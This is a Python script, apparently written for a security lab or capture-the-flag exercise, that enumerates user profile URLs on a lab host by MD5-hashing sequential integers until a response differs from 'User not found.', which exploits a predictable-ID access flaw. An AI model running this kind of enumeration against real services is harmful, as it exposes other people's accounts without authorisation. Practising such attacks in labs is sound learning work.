import hashlib
import sys

import requests


def verify_url_content(
    session: requests.Session, url: str, expected_output: str, timeout: int = 10
) -> bool:
    try:
        response = session.get(url, timeout=timeout)

        # Normalize whitespace to prevent false flags from trailing newlines
        actual_output = response.text.strip()
        expected_clean = expected_output.strip()

        if actual_output != expected_clean:
            print(
                f"\n[FOUND] Content mismatch for: {url} (Status: {response.status_code})"
            )
            print(f"  Expected: {expected_clean[:100]}")
            print(f"  Received: {actual_output[:300]}")
            return False

        return True

    except requests.exceptions.RequestException as error:
        print(f"\n[ERROR] Request failed for: {url} ({error})")
        return True  # Return True to keep scanning even if a single request times out


if __name__ == "__main__":
    base_url = "http://xebec.cylabacademy.net:38636/profile/user/"
    expected_text = "User not found."

    # Use a Session to reuse the underlying TCP connection for speed
    with requests.Session() as session:
        for i in range(3101):
            # Convert number to string, encode to bytes, and extract the hex digest
            hash_hex = hashlib.md5(str(i).encode("utf-8")).hexdigest()
            full_url = f"{base_url}{hash_hex}"

            # Print live progress on a single line
            print(f"\r[*] Testing ID {i}/3000 ({hash_hex})...", end="", flush=True)

            # Stop and exit once a valid user profile (mismatch) is found
            if not verify_url_content(session, full_url, expected_text):
                print(f"[+] Matched on integer ID: {i}")
                sys.exit(0)

    print("\n[-] Finished scanning 0 to 3000. No anomalous profile found.")
